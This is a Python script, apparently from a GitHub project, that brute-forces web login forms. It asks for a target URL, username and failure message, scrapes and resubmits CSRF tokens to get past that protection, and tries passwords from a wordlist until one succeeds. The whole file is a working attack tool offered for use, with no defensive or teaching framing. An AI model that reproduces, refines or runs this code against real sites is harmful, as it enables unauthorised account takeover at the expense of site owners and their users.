######################################################################################################
# Title: Brute force                                                                                 #
# Author: Tanvir Hossain Antu                                                                        #
# Github : https://github.com/Antu7      
# If you use the code give me the credit please #
######################################################################################################

print (""" 

██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
                                                                            
                   Tanvir Hossain Antu
        https://github.com/Antu7/python-bruteForce


""")

import threading
import requests
import time
import sys
import re
import logging
from bs4 import BeautifulSoup

# Logging setup
info_handler = logging.FileHandler("logs/security.log", encoding='utf-8')
info_handler.setLevel(logging.INFO)
info_handler.setFormatter(logging.Formatter(
    '[%(levelname)s] %(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S'
))
# Error logging
error_handler = logging.FileHandler("logs/error.log", encoding='utf-8')
error_handler.setLevel(logging.ERROR)
error_handler.setFormatter(logging.Formatter(
    '[%(levelname)s] %(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S'
))
# Add handlers to logging
logging.getLogger().handlers = []
logging.getLogger().addHandler(info_handler)
logging.getLogger().addHandler(error_handler)
logging.getLogger().setLevel(logging.INFO)


class BruteForceCracker:
    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message
        self.session = requests.Session()
        
        for run in banner:
            sys.stdout.write(run)
            sys.stdout.flush()
            time.sleep(0.02)

    def get_csrf_token(self):
        try:
            response = self.session.get(self.url)
            # Try to extract token using BeautifulSoup
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Look for common CSRF token field names
            csrf_field = soup.find('input', attrs={'name': re.compile(r'csrf|CSRF|token|_token', re.I)})
            if csrf_field and csrf_field.has_attr('value'):
                logging.info(f"Found CSRF token: {csrf_field['name']}={csrf_field['value'][:10]}...")
                return csrf_field['name'], csrf_field['value']
            
            # Alternative method: look for meta tags
            meta_token = soup.find('meta', attrs={'name': re.compile(r'csrf|CSRF|token', re.I)})
            if meta_token and meta_token.has_attr('content'):
                logging.info(f"Found CSRF token: {meta_token['name']}={meta_token['content'][:10]}...")
                return meta_token['name'], meta_token['content']
            
            # Last resort: try to find it in the HTML with regex
            match = re.search(r'name=["\'](_csrf|csrf_token|CSRF|token)["\'] value=["\'](.*?)["\']', response.text)
            if match:
                logging.info(f"Found CSRF token: {match.group(1)}={match.group(2)[:10]}...")
                return match.group(1), match.group(2)
                
            print("Could not find CSRF token. The site might use a different method.")
            logging.info("Could not find CSRF token. The site might use a different method.")
            return None, None
        except Exception as e:
            print(f"Error getting CSRF token: {e}")
            logging.error(f"Error getting CSRF token: {e}")
            return None, None

    def crack(self, password):
        # Get a fresh CSRF token for each attempt
        token_name, token_value = self.get_csrf_token()
        
        # Prepare the login data
        data_dict = {"UserName": self.username, "Password": password, "Log In": "submit"}
        
        # Add CSRF token if found
        if token_name and token_value:
            data_dict[token_name] = token_value
            print(f"Using CSRF token: {token_name}={token_value[:10]}...")
            logging.info(f"Using CSRF token: {token_name}={token_value[:10]}...")
        
        # Make the login attempt
        response = self.session.post(self.url, data=data_dict)

        # Check if login was successful
        if self.error_message in str(response.content):
            logging.info(f"Login failed with password: {password}")
            return False
        else:
            print("\n[+] Success!")
            print("Username: ---> " + self.username)
            print("Password: ---> " + password)
            logging.info(f"Login successful with password: {password}")
            return True

def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        count += 1
        password = password.strip()
        print(f"Trying Password: {count} Time For => {password}")
        logging.info(f"Trying Password: {count} Time For => {password}")
        if cracker.crack(password):
            logging.info(f"Login successful with password: {password}")
            return

def main():
    url = input("Enter Target Url: ")
    username = input("Enter Target Username: ")
    error = input("Enter Wrong Password Error Message: ")
    
    print("\n[*] Checking if site uses CSRF protection...")
    logging.info("[*] Checking if site uses CSRF protection...")
    cracker = BruteForceCracker(url, username, error)
    token_name, token_value = cracker.get_csrf_token()
    
    if token_name and token_value:
        print(f"[+] CSRF token found: {token_name}")
        logging.info(f"[+] CSRF token found: {token_name}")
        print("[*] Will attempt to bypass by extracting and including token with each request\n")
        logging.info("[*] Will attempt to bypass by extracting and including token with each request\n")
    else:
        print("[-] No CSRF token found or using a different protection method\n")
        logging.info("[-] No CSRF token found or using a different protection method\n")
    
    with open("passwords.txt", "r") as f:
        chunk_size = 1000
        while True:
            passwords = f.readlines(chunk_size)
            if not passwords:
                break
            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            t.start()
            t.join()

if __name__ == '__main__':
    banner = """ 
                       Checking the Server !!        
        [+]█████████████████████████████████████████████████[+]
"""
    print(banner)
    main()